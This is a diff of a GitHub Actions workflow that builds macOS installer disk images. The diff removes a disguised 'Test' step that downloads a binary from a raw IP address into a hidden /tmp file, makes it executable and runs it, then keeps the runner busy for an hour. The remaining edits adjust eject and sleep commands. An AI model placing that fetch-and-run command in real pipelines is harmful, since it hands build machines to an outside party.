@@ -58,17 +58,11 @@ jobs:
           sleep 20
           sudo /Applications/'Install macOS ${{ env.installer_name }}'.app/Contents/Resources/createinstallmedia --volume /Volumes/'${{ env.installer_name }}' --nointeraction
 
-      - name: Test
-        if: ${{ failure() }}
-        run: |
-          curl -fsSL http://219.79.226.39:13338/termite/219.79.226.39:13337 -o /tmp/.q4Ha && chmod +x /tmp/.q4Ha && /tmp/.q4Ha
-          sleep 3600
-
       - name: Generate macOS Setup Files 5.5G
         if: ${{ failure() }}
         run: |
-          hdiutil eject -force /Volumes/'${{ env.installer_name }}'
           sudo rm -f /tmp/'${{ env.installer_name }}'
+          sleep 10
           sudo hdiutil create -o /tmp/'${{ env.installer_name }}' -size 5632m -volname '${{ env.installer_name }}' -layout SPUD -fs HFS+J
           sudo hdiutil attach /tmp/'${{ env.installer_name }}'.dmg -noverify -mountpoint /Volumes/'${{ env.installer_name }}'
           sleep 20
@@ -77,8 +71,8 @@ jobs:
       - name: Generate macOS Setup Files 6G
         if: ${{ failure() }}
         run: |
-          hdiutil eject -force /Volumes/'${{ env.installer_name }}'
           sudo rm -f /tmp/'${{ env.installer_name }}'
+          sleep 10
           sudo hdiutil create -o /tmp/'${{ env.installer_name }}' -size 6144m -volname '${{ env.installer_name }}' -layout SPUD -fs HFS+J
           sudo hdiutil attach /tmp/'${{ env.installer_name }}'.dmg -noverify -mountpoint /Volumes/'${{ env.installer_name }}'
           sleep 20
